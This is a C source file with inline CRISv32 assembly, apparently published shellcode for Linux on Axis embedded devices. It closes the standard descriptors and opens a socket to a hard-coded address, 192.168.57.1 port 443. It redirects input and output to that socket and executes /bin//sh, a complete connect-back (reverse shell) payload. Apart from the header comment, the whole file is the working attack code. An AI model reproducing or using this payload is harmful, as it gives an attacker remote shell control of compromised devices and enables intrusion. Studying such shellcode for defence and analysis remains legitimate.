/*
 * Linux/Crisv32 connectback asm code
 * Author: mcw / 2016-02
 *
 * crisv32-axis-linux-gnu-gcc -Wall -finline-functions -fno-common \
 * -fomit-frame-pointer -static -o crisv32-asm crisv32-asm.c
 */

#include <stdio.h>

main(){
__asm__("

clear.d $r10
movu.w 0x6,$r9
break 13

moveq 1,$r10
movu.w 0x6,$r9
break 13

moveq 2,$r10
movu.w 0x6,$r9
break 13

addoq 16,$sp,$acr
moveq 2,$r9
move.w $r9,[$acr]
addoq 16,$sp,$acr
addq 2,$acr
move.w 0xbb01,$r9
move.w $r9,[$acr]
addoq 16,$sp,$acr
move.d $acr,$r9
addq 4,$r9

move.d 0x139a8c0,$acr
move.d $acr,[$r9]
moveq 2,$r10
moveq 1,$r11
clear.d $r12

move.d $sp,$r9
move.d $r10,[$r9+]
move.d $r11,[$r9+]
move.d $r12,[$r9+]
moveq 1,$r10
move.d $sp,$r11
movu.w 0x66,$r9
break 13

move.d $r10,$r9
addoq 12,$sp,$acr
move.d $r9,[$acr]
addoq 12,$sp,$acr
move.d $sp,$r9
addq 16,$r9
move.d [$acr],$r10
move.d $r9,$r11
moveq 16,$r12

move.d $sp,$r9
move.d $r10,[$r9+]
move.d $r11,[$r9+]
move.d $r12,[$r9+]
moveq 3,$r10
move.d $sp,$r11
movu.w 0x66,$r9
break 13

move.d [$acr],$r10
moveq 1,$r11
movu.w 0x3f,$r9
break 13

move.d [$acr],$r10
moveq 2,$r11
movu.w 0x3f,$r9
break 13

move.d $sp,$r9
subq 16,$r9
move.d $r9,$r10

move.d 0x69622f2f,$r0
move.d $r0,[$r9+]
move.d 0x68732f6e,$r0
move.d $r0,[$r9+]
clear.d [$r9+]
clear.d [$r9+]

move.d $r10,[$r9+]
clear.d [$r9+]

move.d $sp,$r11
clear.d $r12
moveq 11,$r9
break 13

");

}

